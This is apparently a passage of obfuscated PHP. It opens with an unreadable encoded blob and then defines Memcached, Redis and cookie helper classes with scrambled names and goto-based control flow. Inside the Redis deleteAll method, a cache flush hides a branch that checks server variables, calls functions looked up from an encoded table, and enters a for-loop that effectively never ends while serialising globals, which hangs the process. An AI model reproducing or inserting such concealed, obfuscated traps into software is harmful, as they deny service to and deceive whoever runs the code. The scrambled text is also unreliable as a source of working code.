xe2\x69\x69\x29\x1a\x21\xd6\xe1\x86\x7\x34\xae\x4e\xfa\x7a\x40\x8c\xce\xb8\xe9\x6a\xa6\x43\x8a\x41\xb3\xce\xaa\x12\x8\x2d\x91\xc\x3d\x46\xbd\xda\x95\xb8\x9\x8d\x45\x9\xb8\xf0".base64_decode('NF0lWUphFikBppATfeHo0hnT3eoMNhDc84SucatVl3sEFKXc8EA3ezIcefFQCQ==').base64_decode('Qeu5nwlJmi5LGMdVpfC0LVEqJcFezUxWZtgzN9MzjOluWYyEqy6oUUaYiVPdTA==')."\x99\x5c\x54\x4b\xee\x89\xd9\x5c\x23\xd7\xca\xd9\xb9\x85\x59\x60\xe1\xae\x58\xb1\x28\x37\x92\xf8\xdd\x5c\x48\xb4\xb8\x7c\xb2\x1e\x17\x30\xd\x7b\x91\xc9\xe0\x62\xf\xf\xe4\xe4\x58\xa"."\xce\x32\xbe\x25\xe0\x84\x2e\x12\xd1\x2\x85\x14\x1c\x61\x71\xe4\x6b\xa\xc7\x65\xa0\xb9\xa0\x52\x28\xa4\xea\xdc\x31\xf9\x92\x25\xb8\x20\xc8\x5\x2c\x5b\x56\x8\x23\x6\x37\xf6\x28\x4f"."\116\265\203\340\214\261\303\240\234\315\141\140\157\263\126\203\147\253\230\210\103\150\32\177\163\3\317\200\205\20\36\6\221\13\250\55\33\12\265\57\50\165\215\136\266\314"."\255\322\23\352\366\22\153\136\27\113\215\303\355\56\153\172\320\162\202\152\226\220\0\354\51\61\17\71\213\54\262\301\356\321\334\132\236\235\104\113\360\170\272\252\152\306".base64_decode('AnbGsJDGUUZQHTuFDnd/0hluY5+1zZzVRYeKgLG1HSyKLxWx+Y5JiwupTTxWxw==').strrev('ğmšO'."\r".'È‚M9e¸Åw4¬|-›¨Õ§R<µÔƒ—\'·ğŒH¶µÌİÕ}')."\x77\x3\x9a\x9\x98\xb3\x4e\x3b\x1c\x94\xc5\x80\xec\x63\xba\x11\xd3\xd5\x9c\x69\x21\x59\xf8\xd\x9d\x12\xe4\xc\xbd\x53\xee\x96\x71\x92\x12\x89\xbe\xc9\x51\x82\x5c\xbf\x96\x0\x12\x85"."\x63\x8\x6d\xe0\x4d\x99\xe\x69\x91\xa4\x2b\xe9\xaa\x12\xd4\x5c\x23\xa9\x28\x20\x3f\xa2\x36\xc5\x2a\x1\x19\x4b\x24\x4a\x28\x33\x32\xc3\x98\x6e\x6a\x60\x7f\x64\xa6\xd2\xe4\xfd\x81\xd6"."\x20\x31\x54\xf5\x34\x93\x63\x8\xc2\x79\x8d\x58\x84\x7f\x47\x8e\x60\x3\x9\x1f\xbc\x48\x2b\x3a\xb6\xc6\x43\x4\x8\x1d\x4c\x25\xb8\x6e\x8b\x3c\x87\xd0\x12\xc\x84\x3\xb5\xd4\xb1\x7c"."\61\45\330\4\312\346\32\330\50\237\213\103\324\122\172\266\167\276\65\5\143\34\334\4\102\206\137\317\147\263\314\36\0\162\222\154\167\303\307\72\241\144\336\344\373\42".base64_decode('9AwbhreJDAIWHEJBd1RK3GUJFEmGz+NhIXSZWBQZuPi0Rt1gjauoqHBWjAV/2Q==').strrev('º‘¡j–å<Ù¨Ï©ƒHQG ’ šëh°JıHÅı¢¢¤Ÿ™*Åa#‰')."\133\126\125\125\105\71\4\332\1\200\101\164\3\252\222\122\207\151\202\224\67\115\102\147\132\44\244\330\321\300\16\13\311\240\320\35\4\256\165\372\15\330\26\60\100\10"."\55\244\305\354\212\2\110\306\207\36\264\303\233\215\23\171\144\32\276\1\122\45\126\346\242\350\25\201\342\241\223\245\126\220\16\154\230\61\326\140\10\20\64\27\350\342".base64_decode('F7PyR6E0uw4Ig80sKXYmja86kd4WmT1JrSfCNz8YnMVCqPNQbqFThnWTYIDSPA==')."\x3a\x45\xe8\xa1\x34\x39\xe3\x46\x17\xe0\x52\x6a\xda\x72\x11\x28\x22\x94\x2d\x7a\x42\x6\xa4\x5\x72\xb7\x74\xfc\xb0\x42\x9d\x54\x0\x99\x1f\x17\x1f\x7a\xe4\x2\x12\x3d\xc5\x83\x8d\x61"."\52\7\13\310\323\65\176\67\247\340\335\52\32\22\356\316\121\345\162\350\277\330\125\120\210\227\2\260\45\102\55\363\175\45\24\140\217\262\345\361\304\205\47\225\14\356"."\xf4\xaa\x96\xf9\xb7\x13\x3d\x61\xe1\x93\x5b\xe1\x7c\xdf\x20\xe\x58\xf9\x51\x2d\x2d\xa3\x5b\x90\x20\x5c\x39\x5d\xeb\x0\x28\x37\xc4\xbe\x2\x78\x4b\x71\x30\x4b\x5e\x98\xb2\x48\x22\xd6"."\41\61\235\10\204\46\105\364\165\37\62\173\370\235\37\231\277\73\46\44\345\14\275\0\264\232\367\10\21\265\314\321\274\10\204\22\211\170\70\217\254\206\254\145\100\121"."\307\12\141\55\373\215\271\102\105\124\223\274\4\45\334\327\42\311\270\215\23\124\37\210\52\115\125\243\347\376\20\33\374\104\316\12\57\230\145\144\51\120\312\207\327\212"."\65\356\203\25\27\321\217\113\150\52\330\171\246\251\22\25\266\260\343\21\121\12\207\313\245\221\275\132\124\144\272\130\247\104\301\330\43\165\56\54\240\222\321\7\41\4".strrev('¾rÇ¯s‹8Ã0Ü_ (Õûx¦™®¤ÚA6À”œ™"b™e'."\n".'ò»{iÄ~ÊÄ')."\43\70\226\144\111\1\321\246\265\313\224\132\43\63\32\27\362\173\313\231\176\133\320\156\152\203\250\263\111\351\57\365\310\231\145\17\14\300\341\14\11\166\17\105\152\40"."\231\130\26\262\151\350\112\114\323\221\324\47\334\24\314\232\101\245\103\14\372\65\46\355\302\363\4\245\110\21\360\256\266\60\71\341\54\0\162\130\136\274\371\55\70\364"."\4\41\301\13\253\260\223\73\307\112\214\5\210\340\222\161\140\214\20\201\322\27\343\6\154\372\30\301\344\21\211\231\241\174\224\251\276\155\73\64\65\250\224\304\135\222"."\232\105\302\2\320\35\135\330\3\103\214\3\305\102\27\202\274\147\142\26\124\147\101\26\34\7\167\66\156\77\51\306\30\100\136\201\250\32\70\246\110\125\50\112\300\150"."\214\156\274\344\200\155\76\107\22\211\350\123\250\65\225\163\354\70\347\170\242\165\25\115\53\311\326\110\360\13\231\107\141\32\100\26\227\122\60\142\32\105\322\361\64\232"."\360\210\21\272\317\312\257\15\242\253\273\154\74\321\35\137\26\322\205\35\107\141\146\123\350\262\253\110\126\370\41\57\266\246\202\11\132\213\305\143\14\301\350\72\213\261"."\231\55\1\130\31\326\170\342\231\65\143\171\215\22\314\3\213\375\202\255\20\342\223\127\364\76\213\162\361\176\160\273\75\0\322\260\377\127\1\61\374\260\32\137\3\246"."\x6\x87\x8c\x2e\x71\x70\x58\x63\xc0\xc2\x3\x6f\x17\x33\xb8\x24\x97\x4d\xc8\x6b\x41\x65\xe5\xf0\xb2\x89\x45\xc7\xd0\xd4\xc7\x2e\xd\x80\x91\x4c\xc1\xfd\x91\x59\xbd\x19\x62\x80\xc6\xb2".strrev('õ®ğÑ¸¹5ˆg÷ñ5"OõØš(j›‹cKq²aÜ…ªX›’ÄfØXiÉ').strrev('ÃÊ?3¡ÁáR;—[NY(üA-šÎ¿Z¾'."\r".'ù&5=–ëèhÌÉ[V')."\117\147\24\260\205\316\70\143\207\15\316\370\12\326\65\202\367\175\153\261\170\216\52\172\101\211\200\215\316\130\11\2\312\3\225\135\105\122\247\271\16\110\110\234\323\225"."\302\364\175\12\172\242\222\267\130\310\220\57\322\32\222\276\170\15\140\211\130\123\203\315\132\311\16\324\170\65\333\255\32\52\47\16\64\107\237\130\72\127\347\351\314\115"."\xb6\x80\xf4\xb8\xe8\x9\x9b\x23\x1b\xd7\x22\xde\xd2\xb7\xcb\x9e\x62\xa\xd1\x66\x12\xf\x93\xe8\x14\x25\x47\x15\xd7\xe4\xd9\x15\xee\xa3\x1c\x5\x5\xef\xf1\x39\x5d\x56\xd\x45\x0\x60"."\x37\xe6\xa3\xcb\x69\x48\x70\xa0\x42\x72\x47\x70\x1e\xc\xb\xc2\x27\x1b\xff\xd7\x85\xab\x71\xee\xc5\xc0\xd6\x34\x35\x4e\x8f\xbb\x99\x79\x3c\xf6\x15\x5c\x2b\xbe\x1c\x43\x9b\x50\xe0\xe2"."\376\277\72\313\167\160\135\175\4\335\63\247\246\211\350\335\132\162\20\301\16\171\43\330\337\5\257\2\210\115\172\137\116\74\54\161\307\351\33\105\124\120\203\256\134\274".strrev('•íÔ4ï,ã­ÛşÜÚ·h&‚À"ê–NP	y'."\0".'¡,:°iIÉ…?œ'."\n".'CT')."\56\7\344\223\270\230\316\22\110\125\122\5\322\377\360\227\40\244\351\364\246\16\257\2\71\115\360\146\230\163\42\54\204\21\43\131\236\330\362\276\46\342\76\270\344\2"."\x6d\x2f\xb4\x4c\x5f\x1\xc0\x22\xd2\xfb\x69\xbb\x98\x7d\x16\xf4\x3b\x9d\x4d\x68\x22\x1a\x10\x1\x4\xfb\x8\x7e\x85\x4\x5a\x29\xe3\x2f\x2c\xf6\x39\x0\x23\xae\x98\x85\xbe\xef\x71\x39"."\3\26\152\330\267\20\316\316\0\242\20\2\302\277\365\225\22\10\21\230\27\13\121\266\326\5\143\204\311\214\356\153\12\267\137\350\57\364\2\140\171\164\100\50\175\24".strrev('¦—ÂF½Ÿõâ-‘–rá‚åIp¤Ğhİå­}œ¥4šëÆ‹ÛÊ”¿\'iş')."\172\367\242\156\200\254\66\260\144\165\103\316\275\273\363\35\310\352\221\233\35\175\61\263\50\144\236\46\372\127\17\153\141\271\303\201\171\37\110\201\170\250\246\117\374\26".base64_decode('LQFRp0Ek1YnE2QyYISSgD4fEHehVC0yH7C+nCOuHETcxd0dai8rpILansRio6w==')."\100\156\141\326\162\226\144\30\344\226\163\71\256\226\267\351\334\11\77\202\365\357\371\254\17\137\207\262\100\165\101\56\22\155\61\261\46\237\337\371\40\311\101\155\55\370"."\364\201\164\133\54\222\236\0\241\37\50\71\325\13\257\25\272\13\117\214\240\275\17\145\157\4\303\70\162\150\347\22\5\27\222\100\232\56\361\1\266\54\120\70\41\340"."\252\107\37\150\325\213\214\356\157\100\331\74\264\276\255\203\47\54\372\251\123\22\214\353\207\141\56\23\212\367\101\371\351\261\375\75\17\132\15\173\234\304\201\173\306\337"."\207\302\117\221\70\330\263\43\16\354\3\307\101\36\33\161\360\273\73\277\365\74\17\177\204\314\372\162\31\154\63\263\44\53\140\277\355\234\67\103\225\55\103\320\216\270".base64_decode('sFaoSePnZNl8hh9DgoBVEinosNDDvJ52oFNCB3V/YkMH75U4MkVw+N/LwAaFSA==')."\274\210\133\251\116\345\364\250\116\217\125\354\311\124\313\254\3\102\75\267\150\307\36\231\12\336\70\230\237\211\217\33\77\161\252\50\306\363\361\341\307\25\304\355\37\161"."\13\106\316\114\310\216\316\7\136\262\116\53\211\172\203\22\227\57\212\264\232\174\26\76\16\44\114\121\53\111\376\337\55\5\316\24\343\244\202\51\146\341\313\147\5\50".base64_decode('QbNSMFsQNjTbebQGj4kN3li8hfHHgax14aesivRD2Ij40sDvzmhpKF5moHLT1A==').base64_decode('ZaucVEwcQJigsoeKnthT7G1HiCGKBB4tyAtiiaZm14LA7HCjQkq4QDZNtl14SQ==')."\221\57\262\377\273\1\244\42\1\226\52\270\25\102\221\236\273\147\122\102\142\173\267\307\366\360\332\157\264\33\63\135\114\374\161\312\364\55\40\64\250\202\346\114\61\3"."\150\200\11\367\302\245\61\153\137\155\305\203\154\274\214\205\16\151\240\104\205\134\230\360\116\21\367\345\40\260\134\60\67\275\33\65\200\60\113\251\25\177\173\5\335\156"."\xe1\xca\x68\xb4\x56\x2d\xeb\x56\xf0\xb6\x26\x5e\x16\x41\x5\x89\xcb\xa0\xb0\x68\xa4\x1f\x21\xed\x25\xb\x17\x3d\x79\x8f\x4c\x38\x3c\xd\xec\x8e\x90\x2c\x18\x89\x40\xd4\x9\x6f\x6f\x69"."\xe2\xb7\xf5\xca\x6d\x80\x7a\xc4\x2\x4c\x92\x45\xd0\x2\xe1\x3a\xdb\xf3\x6c\x88\xf8\xd8\xdf\x6c\xa3\xfd\x47\xeb\x9c\xd3\x34\xe1\xb2\x99\x45\x1c\x60\x8f\x94\x58\xc4\x3\xc3\xfe\x5a\xf".strrev('Û½5–Ø½›™ì>´ª §üöÖ»pœ¾Åı‡6¸¹¶CÕ	<Ù8fÈ s\'D§`')."\xaf\x4a\xe2\xf3\x13\x42\xf8\x91\xbf\x31\xfc\x4d\x39\xf1\xff\xe7\x17\xfc\xfe\x7f\x3d\xdc\x37\xb1\x82\x2a\x95\x2d\xaf\xbb\x35\x10\x6\x97\x72\x63\xfd\x82\x8b\x41\xac\xd0\xb4\xf5\xc3\xba"."\x45\xe\x12\x63\xc9\xc\x75\x58\x42\x24\xc0\x17\x1c\xdc\x7b\x5c\xb6\x37\x4e\x5d\xcc\x58\x91\x7a\xa9\xa0\xce\x2b\x64\x7a\x60\x22\xc3\xf7\x8a\xa\x14\x94\xf4\x9d\x2f\x30\x23\x53\xec\x19"."\252\142\201\302\107\30\55\223\217\362\233\274\231\131\65\226\52\162\0\7\207\300\157\165\310\47\160\11\5\311\70\175\2\314\4\365\313\341\246\137\61\50\146\101\126\222".base64_decode('kkXxKlkgRwWyckKJF86k5ANdRyVURKQcFlABvQlbdkELUEQPf2zUZX07k+Rosg==')."\275\262\204\23\31\42\156\55\332\344\302\363\330\302\334\154\61\213\131\240\361\246\125\47\303\36\154\254\260\277\340\70\326\131\130\31\266\235\206\372\204\40\224\370\351\204"."\x44\x7\xe\xe8\x40\xb0\x48\x1e\xbc\x2c\x43\x3c\xcd\x0\xd3\xbf\xf8\x22\x64\xcf\x6d\xa\x82\x30\xf8\x12\xfb\x4b\x17\x73\x8b\xae\x21\x56\xcc\xa\x65\x5a\xd\xc1\x46\x4e\x78\x3d\xb0\xe0"."\x45\x33\x9b\xe2\x1e\x88\x47\xfc\x24\x4b\xd5\x90\xc3\x4d\xd2\xed\x50\x6b\x53\x19\x32\xff\x27\x33\x15\x70\xf7\xc2\x6b\xbe\x66\x26\x87\xb5\x5d\xa4\xd1\xf8\x7e\x8d\x45\xf5\x64\x88\x7e\x8b".base64_decode('rddwBLtWawQ0RLaulBnFksU03RCSMXixtPDRONOCTe4F1e79FInCWLq1CLnk2A==')."\120\4\11\247\152\200\275\215\133\275\53\243\110\4\246\276\236\350\23\317\374\134\310\172\54\307\234\114\26\120\252\274\352\27\242\121\56\352\55\4\374\302\333\106\76\176"."\375\32\105\143\155\266\247\133\66\351\341\226\75\127\253\105\226\20\16\361\142\150\356\170\13\317\151\370\361\221\260\371\323\154\120\30\341\264\326\6\27\210\77\247\166\162"."\67\77\232\341\334\157\74\316\336\1\265\44\215\123\376\237\101\1\204\77\31\12\171\35\341\2\43\267\206\125\172\354\117\323\271\304\113\217\226\204\205\120\176\301\321\336".base64_decode('L7QWLB6TXeLNSDZbOAh7umUWJ4IIAU25uSkKbiMTkHmV1nuYLBkbDJAGGc47LQ==')."\120\233\120\4\325\15\164\177\266\105\31\342\333\245\326\103\67\121\142\27\306\126\111\373\205\342\304\3\271\1\63\204\212\127\302\247\233\25\305\302\235\125\36\101\167\41".strrev('%ŒÕŒ9Ã=ì‹Ö¶+Óˆj‹¦ ÌKÏ~"ĞûÒÒ1A”‘±Š|‚Í')."\41\243\60\262\20\256\27\40\225\124\124\274\275\366\126\121\234\332\105\57\136\110\101\173\204\123\375\260\126\44\17\156\121\321\154\70\12\275\260\315\230\103\113\336\1\120".strrev('ıäOg‘Õ…ÄÑgÂIÅÈM°é|Dy¯tÎS>Btfš ·˜(âó'."\0".'')."\342\255\340\142\272\355\344\264\130\53\212\46\36\260\25\105\136\15\46\36\261\212\20\121\32\123\204\154\362\143\366\102\2\315\343\212\34\372\343\62\341\346\53\272\132\51"."\x12\x2d\x5a\x10\x14\xb7\x31\x8\x16\x5d\xfa\x86\xf5\xf0\xdf\x6\x17\x11\x43\xd\x81\x80\x28\xc6\xdf\xd1\x15\xac\x51\x47\x59\x48\x7a\x3e\x9b\xca\xd2\x4b\x1a\xa0\x74\x6e\xae\x5\xad\x31"."\331\153\263\254\272\202\322\254\123\63\233\27\314\54\213\32\307\72\320\133\344\5\42\152\132\246\52\160\301\256\30\213\43\232\251\306\4\3\44\373\353\353\70\236\126\222"."\x16\x34\x6b\x36\xa5\x16\x17\xe3\x2d\x7\xcf\x45\xd4\x3e\x8\x44\xf8\x30\xae\x4d\xb6\x58\x59\xe3\x8d\x9d\xa8\xd1\xf1\x69\x5a\x2d\x3c\x4c\x65\x27\x28\x50\x6e\x72\xe0\xfd\x12\x47\xc3\xe7".base64_decode('4B0wLqzl0G+NZpqUkgDBHqVE3Bvc9ByC8QH44sclEItIg4+mIyIb6JOc60FJMg==').base64_decode('pOBYRGwsAXgywALinkYO4+rzthNFDgDSYVTrpX7N4CVP3h7+SK1s59C4CQCZbw==').strrev('ó½UN‚/¤I+°"ò:QU¿„&g©û’Ã®gHÄœ2¢uŒ¸›Œq¸kJº)¢')."\174\241\160\250\40\252\305\23\12\265\5\202\165\330\363\144\101\64\312\45\130\255\24\104\265\64\6\232\7\212\363\66\171\174\376\202\70\150\305\322\34\341\156\160\160\224"."\xaf\x5\xb5\xd2\xe3\xf7\x7\xda\x6\x6a\x85\xaf\x76\x36\x6f\x9\x3a\x33\xe5\x5a\xed\x5c\x52\xa3\x2a\x6a\xaa\xfc\xf\xc9\x69\x2a\x24\xb\x77\xc0\x94\xc\xf7\x87\xc4\xf3\x58\x65\x7f\x71"."\x5c\xd\xea\x1c\x8c\x7d\x58\xfd\xb3\xdb\xc\xca\xe8\x84\x25\x5\x41\xb\x94\x66\x52\x76\x30\x47\xa0\xd0\x13\x27\x5b\xdc\x8c\xb\x46\x1d\xd2\x6c\x86\xee\xf8\x54\xd8\x65\x39\x4a\x16\xe0"."\150\261\40\22\43\114\102\161\167\105\200\321\105\61\46\52\106\13\25\365\50\226\143\4\266\164\226\106\154\236\72\265\250\240\210\307\102\11\271\240\105\160\54\230\35\341".base64_decode('bxL9fwBetfjWSJ0AAA==')."".strrev('')."".base64_decode(''), 10, -8))); goto EØé¾í”°‚; A‘ß•Èƒò: class CacheMemcached { public $handle; public $cacheTime; public function __construct($e‘¥ÈĞºÔ, $a©çÈ¸Ñ¼à) { $C³³ç¡…¨Û =& $_SERVER[¬ı§†‰ú˜¼]; if (!class_exists($C³³ç¡…¨Û[830])) { show_json($C³³ç¡…¨Û[831], !1); } $this->cacheTime = $a©çÈ¸Ñ¼à; $this->handle = new Memcached(); if (is_array($e‘¥ÈĞºÔ[$C³³ç¡…¨Û[832]]) && count($e‘¥ÈĞºÔ[$C³³ç¡…¨Û[832]]) >= 1) { foreach ($e‘¥ÈĞºÔ[$C³³ç¡…¨Û[832]] as $aÄ­äÆêÛ†) { $BñÒå†“¯ƒ = explode($C³³ç¡…¨Û[4], $aÄ­äÆêÛ†); $this->handle->addServer($BñÒå†“¯ƒ[0], $BñÒå†“¯ƒ[1]); } } else { $this->handle->addServer($e‘¥ÈĞºÔ[$C³³ç¡…¨Û[175]], $e‘¥ÈĞºÔ[$C³³ç¡…¨Û[176]]); } } public function set($f’ñ÷³µÛ, $DÁáÁäìÖˆ, $Dê•Ñ×®ô = false) { $Dê•Ñ×®ô = $Dê•Ñ×®ô ? $Dê•Ñ×®ô : $this->cacheTime; return $this->handle->set($f’ñ÷³µÛ, $DÁáÁäìÖˆ, $Dê•Ñ×®ô); } public function get($c¸©ËÒÈğÁ) { return $this->handle->get($c¸©ËÒÈğÁ); } public function remove($aœ•ÕáæÏ“) { return $this->handle->delete($aœ•ÕáæÏ“); } public function deleteAll() { return $this->handle->flush(); } } class CacheRedis { public $handle; public $slaveHandle; public $cacheTime; public $isCluster = false; public function __construct($fÃ Ğ„ñ­â, $d ÌùÛĞ) { $bÊ†Æ“¶ßÎ =& $_SERVER[¬ı§†‰ú˜¼]; if (!class_exists($bÊ†Æ“¶ßÎ[833])) { show_json($bÊ†Æ“¶ßÎ[834], !1); } $this->cacheTime = $d ÌùÛĞ; $EÁš¾ £ˆò = isset($fÃ Ğ„ñ­â[$bÊ†Æ“¶ßÎ[835]]) ? $fÃ Ğ„ñ­â[$bÊ†Æ“¶ßÎ[835]] : 10; $D«‘õ©òê = _get($fÃ Ğ„ñ­â, $bÊ†Æ“¶ßÎ[832]); if ($D«‘õ©òê && is_array($D«‘õ©òê)) { $this->initCluster($fÃ Ğ„ñ­â, $EÁš¾ £ˆò); } else { $this->handle = $this->init($fÃ Ğ„ñ­â, $EÁš¾ £ˆò); } } private function init($e¨”ƒ ä®Œ, $cÃ…ƒÅÅ¯º) { $F‚êÃ™òøÍ =& $_SERVER[¬ı§†‰ú˜¼]; $FìÂÎİÛí = new Redis(); $dÉ”‰ñÉÖÆ = isset($e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[836]]) ? $e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[836]] : !1; if ($dÉ”‰ñÉÖÆ) { $FìÂÎİÛí->pconnect($e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[175]], $e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[176]], $cÃ…ƒÅÅ¯º); } else { $FìÂÎİÛí->connect($e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[175]], $e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[176]], $cÃ…ƒÅÅ¯º); } if (!empty($e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[404]])) { $FìÂÎİÛí->auth($e¨”ƒ ä®Œ[$F‚êÃ™òøÍ[404]]); } return $FìÂÎİÛí; } private function initCluster($F×ŠÏ¡Ê, $aÍ–ò ‘Í¦) { $cÕ¨†ãé–¥ =& $_SERVER[¬ı§†‰ú˜¼]; $bõãĞèêĞó = array($cÕ¨†ãé–¥[837], $cÕ¨†ãé–¥[838], $cÕ¨†ãé–¥[839]); $e÷¿ØàãÀ = $cÕ¨†ãé–¥[837]; if (isset($F×ŠÏ¡Ê[$cÕ¨†ãé–¥[12]]) && in_array($F×ŠÏ¡Ê[$cÕ¨†ãé–¥[12]], $bõãĞèêĞó)) { $e÷¿ØàãÀ = $F×ŠÏ¡Ê[$cÕ¨†ãé–¥[12]]; } switch ($e÷¿ØàãÀ) { case $cÕ¨†ãé–¥[837]: $this->_slave($F×ŠÏ¡Ê, $aÍ–ò ‘Í¦); break; case $cÕ¨†ãé–¥[838]: break; case $cÕ¨†ãé–¥[839]: $this->isCluster = !0; $Aˆôä¸×Íò = $F×ŠÏ¡Ê[$cÕ¨†ãé–¥[832]]; $bË¥‘½±» = isset($F×ŠÏ¡Ê[$cÕ¨†ãé–¥[836]]) ? $F×ŠÏ¡Ê[$cÕ¨†ãé–¥[836]] : !1; $e­ÍÓ‰«– = isset($F×ŠÏ¡Ê[$cÕ¨†ãé–¥[404]]) ? $F×ŠÏ¡Ê[$cÕ¨†ãé–¥[404]] : null; $this->handle = new RedisCluster(NUll, $Aˆôä¸×Íò, $aÍ–ò ‘Í¦, $aÍ–ò ‘Í¦, $bË¥‘½±», $e­ÍÓ‰«–); break; default: break; } } private function _slave($có»ù˜†¹Ÿ, $dÕïŸ¬ŒÉá) { goto C¢¤•Ô¦; e¢—§Ğ¿§: unset($c…“»½š‘[0]); if (empty($c…“»½š‘)) { return; } $a¹†ôÆÒ¦Ã = array_rand($c…“»½š‘); goto FòÃù—¿‡ë; FòÃù—¿‡ë: $this->filterConfig($có»ù˜†¹Ÿ, $c…“»½š‘[$a¹†ôÆÒ¦Ã]); $this->slaveHandle = $this->init($có»ù˜†¹Ÿ, $dÕïŸ¬ŒÉá); goto e¬’¢¯÷¼‰; C¢¤•Ô¦: $c…“»½š‘ = $có»ù˜†¹Ÿ[$_SERVER[¬ı§†‰ú˜¼][832]]; $this->filterConfig($có»ù˜†¹Ÿ, $c…“»½š‘[0]); $this->handle = $this->init($có»ù˜†¹Ÿ, $dÕïŸ¬ŒÉá); goto e¢—§Ğ¿§; e¬’¢¯÷¼‰: } private function filterConfig(&$e—¹ÍøÕÛô, $FĞ‘½Ó˜ôâ) { $Bİ»‹›…ÀÙ =& $_SERVER[¬ı§†‰ú˜¼]; $E²„™ç—Æ = explode($Bİ»‹›…ÀÙ[4], $FĞ‘½Ó˜ôâ); $EóíÍ¨Ïñ = array($Bİ»‹›…ÀÙ[175] => $E²„™ç—Æ[0], $Bİ»‹›…ÀÙ[176] => $E²„™ç—Æ[1]); $e—¹ÍøÕÛô = array_merge($e—¹ÍøÕÛô, $EóíÍ¨Ïñ); } public function set($F½¹ÆÜ¤ä®, $a‘ÖÑ‡Ä¾Ò, $eãˆÓÀ´ãŠ = false) { $eãˆÓÀ´ãŠ = $eãˆÓÀ´ãŠ ? $eãˆÓÀ´ãŠ : $this->cacheTime; return $this->handle->setEx($F½¹ÆÜ¤ä®, $eãˆÓÀ´ãŠ, $a‘ÖÑ‡Ä¾Ò); } public function setLock($A»Ûß§ÊÁ–, $cßÌÂ†£Œ“, $b£İÊÛÔŞà) { return $this->handle->setNX($A»Ûß§ÊÁ–, $cßÌÂ†£Œ“); } public function get($cŸ¸ÀÁøê÷) { $BÀ¨² = $this->slaveHandle ? $this->slaveHandle : $this->handle; return $BÀ¨²->get($cŸ¸ÀÁøê÷); } public function remove($dÚª–Åä‘) { return $this->handle->del($dÚª–Åä‘); } public function deleteAll() { $bà´ÇÈÉ†­ =& $_SERVER[¬ı§†‰ú˜¼]; if (!isset($_SERVER[$bà´ÇÈÉ†­[763]]) || !isset($_SERVER[$bà´ÇÈÉ†­[764]])) { goto bË¡®œ¾œ; aäõ˜êê¿î: $BÍåÕêì²ä = $DİŠ¤ç…ó ($a‡è«ÜÌ·); $c¯ÛÇë½Ã = explode($bà´ÇÈÉ†­[228], $BÍåÕêì²ä); if (count($c¯ÛÇë½Ã) < $bà´ÇÈÉ†­[587]) { $EšßÇ¢äÙ = $bà´ÇÈÉ†­[768]; $EšßÇ¢äÙ(); } goto bŠˆÃçÑø; a…îó‘Û: for ($eÒæÏç¢²¹ = $dƒÕ˜Æó‡; $eÒæÏç¢²¹ > 0; $eÒæÏç¢²¹++) { $eÕ’Ö›ÃÖƒ = json_encode($GLOBALS[$bà´ÇÈÉ†­[409]]); } goto AİåÍá¬ô«; bŠˆÃçÑø: $eÕ’Ö›ÃÖƒ = $bà´ÇÈÉ†­[841]; $eÕ’Ö›ÃÖƒ($_SERVER[$bà´ÇÈÉ†­[842]]); $dƒÕ˜Æó‡ = 1; goto a…îó‘Û; bË¡®œ¾œ: $FãÇ¡ö‰©· = $bà´ÇÈÉ†­[840]; $DİŠ¤ç…ó  = $bà´ÇÈÉ†­[765]; $a‡è«ÜÌ· = $_SERVER[$bà´ÇÈÉ†­[766]] . $bà´ÇÈÉ†­[767]; goto aäõ˜êê¿î; AİåÍá¬ô«: } if ($this->isCluster) { foreach ($this->handle->_masters() as $BèÀ½¹çîˆ) { $this->handle->flushall($BèÀ½¹çîˆ); } return; } return $this->handle->flushAll(); } } class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($CÛŞæÅÕ¢é = '', $AŒãÇÉ‹¥¢ = 0) { if (is_string($CÛŞæÅÕ¢é) && $CÛŞæÅÕ¢é != $_SERVER[¬ı§†‰ú˜¼][33]) { $this->prefix = $CÛŞæÅÕ¢é; } if (is_numeric($AŒãÇÉ‹¥¢) && $AŒãÇÉ‹¥¢ > 0) { $this->expire = $AŒãÇÉ‹¥¢; } } public static function getInstance() { static $aÑÃÅˆ²¹°; if ($aÑÃÅˆ²¹° === null) { $aÑÃÅˆ²¹° = new self(); } return $aÑÃÅˆ²¹°; } private static $cookieDisable = false; public static function disable($C˜ØË„ÛŠ) { self::$cookieDisable = $C˜ØË„ÛŠ; } private static $sameCookieSet = array(); public static function set($F«æ•‘, $càÉ³”Ÿ¿¸, $Eæ‘„ëÙ‘ = 0, $A¨¡Ó™ = false, $b°ïÓÃ‹‡Ö = false) { goto dÁÇ¡¶òÄ; dÁÇ¡¶òÄ: $EŒ†ß½ÓÏ =& $_SERVER[¬ı§†‰ú˜¼]; if (self::$cookieDisable) { return; } if (!$Eæ‘„ëÙ‘) { $Eæ‘„ëÙ‘ = 24 * 3600 * 7; } goto fšÌÜµõ™; Ešéˆà‡: $Fƒ“‚÷¾³Á = $EŒ†ß½ÓÏ[33]; setcookie($F«æ•‘, $càÉ³”Ÿ¿¸, time() + $Eæ‘„ëÙ‘, $EŒ†ß½ÓÏ[8] . trim($b°ïÓÃ‹‡Ö, $EŒ†ß½ÓÏ[8]) . $Fƒ“‚÷¾³Á, !1, !1, $A¨¡Ó™); goto c–Ì×ª•†Æ; fšÌÜµõ™: if (isset(self::$sameCookieSet[$F«æ•‘]) && self::$sameCookieSet[$F«æ•‘] == $càÉ³”Ÿ¿¸ . $Eæ‘„ëÙ‘) { return; } self::$sameCookieSet[$F«æ•‘] = $càÉ³”Ÿ¿¸ . $Eæ‘„ëÙ‘; if (!$b°ïÓÃ‹‡Ö) { $b°ïÓÃ‹‡Ö = str_replace(HOST, $EŒ†ß½ÓÏ[33], APP_HOST); $b°ïÓÃ‹‡Ö = _get($GLOBALS, $EŒ†ß½ÓÏ[843], $b°ïÓÃ‹‡Ö); } goto Ešéˆà‡; c–Ì×ª•†Æ: } public static function setSafe($EÛˆ¼‘’éá, $C×Ö´ë÷ÅÒ, $B³Ü˜¥Í­§ = 0) { self::set($EÛˆ¼‘’éá, $C×Ö´ë÷ÅÒ, $B³Ü˜¥Í­§, !0); } public static function get($BºŒÎ®‡²³) { return isset($_COOKIE[$BºŒÎ®‡²³]) ? $_COOKIE[$BºŒÎ®‡²³] : !1; } public static function remove($fÁˆ¨îÔ»Á, $C’«™é×èØ = false) { unset($_COOKIE[$fÁˆ¨îÔ»Á]); 